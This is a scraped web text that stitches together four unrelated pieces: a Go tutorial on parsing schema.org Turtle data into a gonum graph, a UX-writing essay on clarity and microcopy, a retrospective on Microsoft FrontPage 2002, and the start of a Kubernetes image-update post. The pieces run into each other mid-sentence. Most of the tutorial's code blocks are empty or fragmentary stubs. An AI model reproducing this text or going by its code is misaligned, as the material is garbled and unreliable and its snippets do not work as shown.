      <p>In a <a href="https://blog.owulveryck.info/2020/11/13/ontology-graphs-and-turtles-part-i.html">previous article</a>, I introduced the notion of ontology and knowledge graph.</p>
<p>Let’s go deeper into the concept and apply some technology to create an actual graph structure and eventually play with it.</p>
<p>At the end of this article, we well have parsed a triplestore in turtle format and created a graph structure in Go (based on <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph">gonum’s interface</a>)</p>
<h2 id="the-triplestore">The triplestore</h2>
<p>As explained in the last post, our knowledge database is a triple store. As a matter of example, I will rely on the ontology exposed by <a href="https://schema.org/">schema.org</a>.</p>
<p>Schema.org is a collaborative, community activity with a mission to create, maintain, and promote schemas for structured data on the Internet, on web pages, in email messages, and beyond. Founded by Google, Microsoft, Yahoo and Yandex, Schema.org vocabularies are developed by an open community process […].
You can grab the complete ontology with this command:</p>
<p>The complete definition is available in turtle format and can be downloaded easily:</p>

</div>
</div><h3 id="parsing-the-store">Parsing the store</h3>
<h4 id="basic-explanation-of-the-parser">Basic explanation of the parser</h4>
<p>To parse the store, I am using the package <a href="https://github.com/deiu/gon3"><code>gon3</code></a> from <a href="https://twitter.com/andreisambra">Andrei Sambra</a>. Even though there is no license attached, Andrei allowed me to use it and to modify it for non-profit code.</p>
<p>I forked the repo to make some minor adjustments I needed for my experiments.</p>
<p>The entry point of the package is a <code>Parser</code> structure. Its purpose is to read a byte stream (<code>io.Reader</code>) and turn it into a functional structure called <code>Graph</code>. The <code>Graph</code> structure within the package is not representing all the edges. Still, it consists of an array of Triples (aka rdf graph):</p>
<div><div>

<pre><code><span>1

	<span>uri</span>     <span>*</span><span>IRI</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>A <code>Triple</code> is a structure holding three <code>Term</code>. One is the subject, one is a predicate, and the last one is the object.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4

<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>In the previous article, we saw that a term in RDF can be expressed in different types. As of today, the way to represent generic types in Go is to use interfaces. Therefore, a <code>Term</code> has an <code>interface</code> based definition:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5

	<span>RawValue</span><span>()</span> <span>string</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Two important objects are implementing the Term interface:</p>
<ul>
<li>IRI</li>
<li>Literal</li>
</ul>
<h4 id="generate-the-rdf-graph">Generate the RDF Graph</h4>
<p>If we glue all the concepts together we have the possibility to create a basic structure:</p>
<div><div>

<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4

<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Then we can test the plumbing with the file we downloaded from schema.org previously:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="shell">&gt; cat schemaorg-current-http.ttl<span>|</span> go run main.go
graph contains <span>15323</span> triples
</code></pre></td></tr></tbody></table>
</div>
</div><p>We can check that roughly the number of triple matches what’s expected by counting the rdf separators from the file:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="shell">&gt; cat schemaorg-current-http.ttl <span>|</span> egrep -v <span>'^@|^$'</span> <span>|</span> egrep -c <span>' \.$| \;$|\,$'</span>
<span>15329</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>The numbers are not identical but alike (the grep command does not evaluate the literal and some punctuation may be wrongly counted)</p>
<h2 id="generating-a-graph">Generating a Graph</h2>
<h3 id="understanding-the-graph-structure">Understanding the graph structure</h3>
<p>We have an “RDF” graph in memory; sadly, this structure is not a directed graph. I mean that it is not <em>de facto</em> possible to navigate from nodes to nodes or to identify the edges.</p>
<p>To create a graph, the best option in Go is to rely on the abstraction created by <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#Graph"><em>gonum</em></a></p>
<p>In Gonum a graph is an interface that manages two objects fulfilling the <code>Node</code> and <code>Edge</code> such as:</p>
<div><div>

</div>
<p><em>Note</em>: all comments have been removed for brevity. The full definition is available <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#Graph">here</a></p>
<p>Once the graph objects are fulfilling those interfaces, it becomes possible to use all the graph algorithms that have been implemented by the gonum team.
Please go to this link if you wish to learn more about the capabilities: <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#section-directories">pkg.go.dev/gonum.org/v1/gonum/graph#section-directories</a></p>
<h4 id="our-graph-structure">Our graph structure</h4>
<p>We will create a top-level structure that will act as a receiver for our graph. For the graph itself, we rely on the <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph/simple#DirectedGraph"><code>simple.DirectedGraph</code></a> implementation provided by the gonum’s project.</p>
<p>So we have:</p>
<div><div>

<pre><code><span>1

<pre><code data-lang="go"><span>type</span> <span>Graph</span> <span>struct</span> <span>{</span>
    <span>*</span><span>simple</span><span>.</span><span>DirectedGraph</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Then we will create a function to create and fill our graph from our rdfGraph.</p>
<div><div>

<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<h3 id="structure-of-the-graph">Structure of the graph</h3>
<p>Remember that the rdf graph contains an array of triples. Each triple is a term.</p>
<p>The object of a predicate is the subject of another triple. For example:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="turtle"><span>schema:</span><span>subject1</span><span> </span><span>schema:</span><span>predicate</span><span> </span><span>schema:</span><span>object1</span><span> </span><span>.</span><span>
</span><span></span><span>schema:</span><span>object1</span><span> </span><span>schema:</span><span>otherPredicate</span><span> </span><span>schema:</span><span>object2</span><span> </span><span>.</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>Would lead to the following graph:</p>
<p><img src="https://blog.owulveryck.info/assets/ontology/graph1.svg" alt=""></p>
<p>This indicates a choice I’ve made: I want to produce a graph where its node corresponds to a subject declared <strong>inside</strong> the triplestore.
Therefore, in the example, <em>object2</em> is not a node because it is not defined as a subject to a sentence. It is relatively easy to change this behavior and reference other nodes, but let’s keep that apart.</p>
<h4 id="declaration-of-the-node">Declaration of the node</h4>
<p>The node object declaration is pretty straightforward. A node is a structure holding:</p>
<ul>
<li>an id</li>
<li>a subject as seen before</li>
<li>and a map of predicates and objects associated with the predicate.</li>
</ul>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>type</span> <span>MyNode</span> <span>struct</span> <span>{</span>
    <span>id</span>              <span>int64</span>
    <span>Subject</span>         <span>rdf</span><span>.</span><span>Term</span>
    <span>PredicateObject</span> <span>map</span><span>[</span><span>rdf</span><span>.</span><span>Term</span><span>][]</span><span>rdf</span><span>.</span><span>Term</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Adding a method <code>ID()</code> that returns an int64 makes it compatible with gonum’s Node interface.
Therefore it is possible to add it to a simple graph. So far, this codes compiles (but is useless):</p>
<div><div>
<table><tbody><tr><td>

<p>Using the same principle, we create an Edge structure that holds two nodes <code>From</code> and <code>To</code> as well as a term that defines the edge.</p>

<p>We have created a graph with two nodes and an edge between them.</p>
<h3 id="parsing-the-rdf-graph-to-generate-our-directed-graph">Parsing the rdf graph to generate our directed graph</h3>
<p>The first thing we’ll do is to create a tree of terms. We do that thanks to a hash map.
The key is a subject, and the value is another map. The map value’s key is a predicate and the value is an array of objects (remember that a predicate can point to several objects)</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>tree</span> <span>:=</span> <span>make</span><span>(</span><span>map</span><span>[</span><span>gon3</span><span>.</span><span>Term</span><span>]</span><span>map</span><span>[</span><span>gon3</span><span>.</span><span>Term</span><span>][]</span><span>gon3</span><span>.</span><span>Term</span><span>)</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>But before parsing the rdf graph to fill the tree, we have to address a little gotcha. a <code>Term</code> is an interface. Therefore it is a pointer. Therefore in the rdf graph, if we consider two <code>Terms</code> <code>t1</code> and <code>t2</code> such as:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>t1</span> <span>:=</span> <span>gon3</span><span>.</span><span>NewLiteral</span><span>(</span><span>"bla"</span><span>)</span>
<span>t2</span> <span>:=</span> <span>gon3</span><span>.</span><span>NewLiteral</span><span>(</span><span>"bla"</span><span>)</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p><code>t1</code> is different from <code>t2</code> (even is their values are the same)</p>
<p>To address this, we will track a dictionary of terms indexed by their <code>RawValue()</code>.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>type</span> <span>Dict</span> <span>map</span><span>[</span><span>string</span><span>]</span><span>rdf</span><span>.</span><span>Term</span>

<span>func</span> <span>(</span><span>d</span> <span>Dict</span><span>)</span> <span>getOrInsert</span><span>(</span><span>t</span> <span>rdf</span><span>.</span><span>Term</span><span>)</span> <span>rdf</span><span>.</span><span>Term</span> <span>{</span>
    <span>//...
</span><span></span><span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Then we iter over the triples from our rdf graph to fille the tree and the dictionary.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>for</span> <span>s</span> <span>:=</span> <span>range</span> <span>rdfGraph</span><span>.</span><span>IterTriples</span><span>()</span> <span>{</span>
    <span>// ... fill dict and tree
</span><span></span><span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p><em>Note</em>: for convenience, we will also set the dictionary as an attribute to our graph for later. The structure becomes:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>type</span> <span>Graph</span> <span>struct</span> <span>{</span>
    <span>*</span><span>simple</span><span>.</span><span>DirectedGraph</span>

</div>
</div>
<p>We can now range over the tree, and create all the nodes in the graph for each subject:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6

    <span>n</span> <span>:=</span> <span>&amp;</span><span>Node</span><span>{</span>
        <span>id</span><span>:</span>              <span>g</span><span>.</span><span>NewNode</span><span>().</span><span>ID</span><span>(),</span>

<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p><em>Note</em>: once again, for convenience, we track the nodes in a hash map. This reference map has the subject as a key and the node as a value (its type is <code>map[rdf.Term]*Node</code>).</p>
<p>Finally, we loop once again through the tree to create the edges:</p>

<p>Now that we have the graph builder ok, we can test it with the data from schema.org we downloaded earlier.</p>
<p>Let’s write a simple program that creates the graph and do a simple query. For example, we may want to get all the nodes directly linked to the  <code>PostalAddress</code> in schema.org.</p>

If you have not not seen it yet, go stream that masterpiece right now. #spoilers</p><p id="0d41"><strong>Why is this particular line so important?</strong> Because it is part of the keychain needed to unlock the many abstract concepts Lynch and Mark Frost presents to us, the viewers. The line is from the episode where Mike enters the dream of agent Cooper, revealing clues about Laura Palmers killer. What I find interesting about this line is its deceptive yet clear intention. The viewer is told what to pay attention to, but the dreamy context suggest we might be deceived.</p><p id="f29a">But some things are just what it is, how it sounds.</p><p id="57db"><em>Intuition guides us, one screen at the time.</em></p><p id="4949">For 10 years, I was writing for various advertising companies. My job was to craft words to lure the reader into whatever brand-context I was working on at that time, often with the help of abstractions of concepts, allegories, and other creative tools. It taught me a lot about perception and how I could, very subtly, plant hints for the viewer to decipher the brand message. But most importantly, it made me understand how the brain systematically create mental concepts to percieve and understand the world around it. Words play a crucial part in this process. An incredible 50 % of all words we hear cannot be understood out of context (when presented in isolation). By using concepts, the brain learns to categorize and make sense of all this variable noisy flow of information.</p><p id="b300">How ironic, you might think, that I found clarity in one of the most surreal dreamscapes ever to air on TV in our lifetime. To me, that’s the beauty of inspiration. It rises to our consciousness like wild salmon jumping upstream a river, striving to get a foothold in our mind amidst all the noise.</p><p id="4668">Like Lynch and Frost, I left the keys in plain sight for the audience to discover and interpret. Creative advertising requires just that, an idea we, the creators, code, and then let the audience decode. But UX Writing very often requires quite the opposite. You must write it like it is.</p><p id="856a">It has always been a beautiful mystery to me, how clarity has the power to shape us. How it informs us simply by being less intrusive or more truthful. <br>To me clarity is not the equivalent of writing short and efficient sentences. It can be about that, but not just that. Clarity is about finding the true essence of whatever you’re trying to convey. It’s what will make your followers believe you or not and go where you’re guiding them. Or not.</p><blockquote><p id="edd9"><strong><em>Just do it</em></strong></p><p id="2f63"><strong><em>I have a dream</em></strong></p><p id="78b1"><strong><em>Fire, walk with me</em></strong></p></blockquote><p id="d321">But clarity is also this</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1660/1*_pOIZ5e4OVW8mpSHrj55qA.png" width="830" height="1170" srcset="https://miro.medium.com/max/552/1*_pOIZ5e4OVW8mpSHrj55qA.png 276w, https://miro.medium.com/max/1104/1*_pOIZ5e4OVW8mpSHrj55qA.png 552w, https://miro.medium.com/max/1280/1*_pOIZ5e4OVW8mpSHrj55qA.png 640w, https://miro.medium.com/max/1400/1*_pOIZ5e4OVW8mpSHrj55qA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/42/1*_pOIZ5e4OVW8mpSHrj55qA.png?q=20"></p></div></div></div><figcaption>Airbnb safely disarming thousands of anxious customers with one single line of text.</figcaption></figure><p id="e258">The real challenge is to fuse the two worlds into one. For that to happen you’ll need to sit down, relax, focus, open your mind and just…</p><p id="cf21">In an interview with <a href="https://www.youtube.com/watch?v=VV7cZB7xqks" rel="noopener">Vanity Fair</a>, Jony Ive, former Chief Design Officer of Apple, said that Steve Jobs had an amazing ability to focus. He managed to eliminate the inevitable noise surrounding any world-changing project and devote all his attention to making it the next big thing.</p><p id="4ba2">Regardless of age, title and which floor you work on, there is a valuable lesson to be learned from this, Focus is needed to build great stuff, but it also essential for knowing when your brand needs to speak up. Or when to shut up.</p><p id="a94a">Understanding when to do what requires <strong>the ability to listen</strong>. I will listen to what the customer says about their experience. Pay attention to what the designers have to say about their intentions and challenges. Concentrate as programmers show me the project’s specifics and possibilities.</p><p id="879e">Jobs did this and was not afraid to change his mind should it benefit his creative singularity. It takes a great amount of willpower to let go of your own ideas.</p><p id="5d5c"><a href="https://youtu.be/woI6t8dCQcQ?t=594" rel="noopener">In an interview with Drumeo,</a> drummer Gavin Harrison, known for his musicality and passion for rhythmic design, shared his tips and methods for coming up with tasteful drum parts, improving your creativity, and your general mindset when playing the drums. While talking about his references from his younger days, he begins talking about drummers who play with time.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1500/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg" width="750" height="500" srcset="https://miro.medium.com/max/552/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 276w, https://miro.medium.com/max/1104/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 552w, https://miro.medium.com/max/1280/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 640w, https://miro.medium.com/max/1400/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg?q=20"></p></div></div></div><figcaption>Gavin Harrison exploring rhytmic designs in his natural habitat.</figcaption></figure><p id="dfc5">“You’ve probably heard this expression before, but everybody’s job in the band is to play in time, but it’s the drummer’s job to make the time interesting. So, you don’t have to just play, say, if the first verse just needs two and four on the hi-hat, you don’t have to just sit there going… <em>&lt;taps uninspired on the hi-hat&gt;</em> …what I would do is listen to the vocalist and look for spaces to do small musical embellishments. <strong>Put it in the right place, and it’s beautiful. Do it every bar, and it’s horrible.”</strong></p><p id="2340">This is <strong><em>precisely</em></strong> what UX Writers should do (among many other important things). Listen to the project as a whole, look for spaces in between code, design, text, menus, forms — literally every point of interaction — to create something that elevates the project, and therefore the brand. Band. You know what I mean. And yes, I consider UX Writing to be an essential part of building and/or maintaining a brand.</p><p id="d052">Words are like <a href="https://en.wikipedia.org/wiki/Ghost_note" rel="noopener">ghost notes</a> providing subtle dynamics to the sonic scenery. They will make people feel something.</p><p id="5f16">Humans like to be liked. Brands too. Therefore we make and effort to portray ourselves, man and brand, in a way that will serve as purposeful and friendly for our peers. From a brand point of view we would very much like people to feel what we want them to feel about us. This is usually where marketing says “we got this”. And they probably do. Persuasion is needed to increase awareness and market shares. But what happens after we get their attention?</p><p id="fe63">This is where guidance and clarity is provided and needed, not juicy headlines and rethorical tropes. Now it’s time to go with (and steer) the flow.</p><p id="eca1">Some people understand this process intuitively and how to utilize it in many different ways. In a talk at Design Matters 2019, Senior Product Writer at Slack <a href="https://medium.com/u/6aad0c825c59?source=post_page-----2b81f09aadfc--------------------------------" target="_blank" rel="noopener">Andrew Schmidt</a> shared insight from Slacks early days on how language could be a tool for identifying “bad” design, and how they discovered when to inject brand personality and how to do it. They came up with a very simple and interesting rule:</p><p id="f0e8"><strong>Never try to make the user feel<br></strong>Instead, look for the feelings they’re already having.<br>And just be part of those.</p><p id="c24e"><strong>👇🏻</strong></p></div></div><div><div><p id="84c2">I believe Slack is on the right path when it comes to how they percieve UX Writing. They have chosen a much less intrusive approach in a world where our minds are bombarded with emotional hooks ready to be reeled in. But for enhancing your UX Writing, I think being subtle and aware (but don’t forget to surprise once in a while) will take you far.</p><p id="acbe">Is your brands presence needed for solving this particular task?<br>Or is it better to get out of the way for a bit? <br><a href="https://uxplanet.org/the-power-of-whitespace-a1a95e45f82b" rel="noopener"><strong>Treat words in the same way designers treat white space.</strong></a></p><p id="cf73">My family owns a summer cabin near the ocean. In my younger days, I would cruise around in our family’s tiny motorboat. That was when I learned the concept of a rudder, a gentle device for navigating smoothly across the sea. This information suddenly reappeared a few years ago when I was writing about ergonomic seating. The company I wrote for had designed a new office chair that kept the person in it slightly moving while sitting down. One of them sat in the chair and used their feet to move around. Seeing this, I suggested to the designers that the feet act as a rudder to navigate the body. According to them, this was a perfect description of what they had accomplished.</p><p id="c439"><strong>I looked. I listened. And I found the embellishment I was looking for.</strong></p><p id="5e4a">In this ocean of information we’re slowly drowning in, I like to think of microcopy as an invisible rudder for our intuition. It’s there to guide you through interactive waters, shallow or deep, without you seeing it. If you can see the rudder, you’ve probably hit bottom, and then you have to slow down to understand the situation. When designing interactivity, people crave fluidity. Like in a musical piece that captivates us or in a movie that enthralls us with great dialogue and scenery. Or even a game like Red Dead Redemption 2 whose job is to help us navigate 60+ hours of content while keeping us immersed in their universe. Well played.</p><p id="54c3">Our understanding of the world is layered in mental concepts. Everything can be stripped down to its very basic components. Even what we know to be basic components has its own basic components. By understanding this, one becomes humble when faced with the task of understanding complex matters. Or answering complicated questions.</p><p id="24c2">Whenever I write, my goal is always to find the simplest version of the truth intended. By truth, I mean the pieces of information I relay to people who desire an outcome of some sort, typically in an app or landing page. Sometimes I need to let function dictate what I write; other times, it feels like a good time to sparkle with some creativity.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2238/1*r7e4HbF2CWByVxNXGxryTg.png" width="1119" height="1117" srcset="https://miro.medium.com/max/552/1*r7e4HbF2CWByVxNXGxryTg.png 276w, https://miro.medium.com/max/1104/1*r7e4HbF2CWByVxNXGxryTg.png 552w, https://miro.medium.com/max/1280/1*r7e4HbF2CWByVxNXGxryTg.png 640w, https://miro.medium.com/max/1400/1*r7e4HbF2CWByVxNXGxryTg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*r7e4HbF2CWByVxNXGxryTg.png?q=20"></p></div></div></div><figcaption>A good example of creative microcopy.

It has to add meaning or value.</p></div></div><div><div><p id="54b7">Bill Bernbach also said that<em> </em><strong><em>advertising is fundamentally persuasion, and persuasion happens to be not a science but an art.</em></strong> This is also something I hold to be true.

	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com/articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com/articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com/articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com/articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com/articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com/articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com/articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com/articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com/articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com/articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com/articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com/articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com/articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com/articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com/articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com/articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com/articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

<p>If you’re anything like me you have made many “new” projects for the web. Perhaps a little website, an API or some little test thing for your friend.&nbsp;</p>



<p>And then: <em>you need to deploy</em>. The first time it’s usually still fine. You’ve done this before. You build your Dockerfile, recycle an old kubespec / deployment.yaml and <code>kubectl apply -f my-app.yaml</code> It’s online; life is good.&nbsp;</p>



<h3><strong>This article is really about what comes after that</strong></h3>



<p>You find a problem. Fix it in your code, docker build the image again, push it. Re-run kubectl apply. Refresh. hmm. the fix doesn’t show up!?</p>



<p><em>The problem is that Kubernetes (and Docker) don’t automatically pull a new version of your image when you don’t change the name of your image.</em></p>



